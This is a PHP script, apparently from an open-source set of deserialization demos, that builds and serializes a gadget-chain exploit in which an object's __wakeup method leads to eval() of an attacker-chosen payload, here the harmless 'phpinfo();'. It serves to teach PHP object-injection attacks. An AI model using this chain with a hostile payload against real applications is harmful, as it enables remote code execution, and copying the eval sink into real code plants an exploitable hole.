#!/usr/bin/env php
<?php
/* Creates gadget chain exploit to STDOUT or file.

   SPDX-License-Identifier: GPL-3.0-or-later

   This file is part of the deserialization demos:
   https://github.com/PeterMosmans/deserialization-demos
 */

class Initial
{
  public $secondary;
  function __wakeup()
  {
    if (isset($this->secondary)) {
      return $this->secondary->sink();
    }
  }
}

class Secondary
{
  public $payload;
  function sink()
  {
    eval($this->payload);
  }
}

$object = new Initial();
$secondary = new Secondary();
$secondary->payload = "phpinfo();";
$object->secondary = $secondary;
$serialized = serialize($object);

include "serialize_function.php";


?>
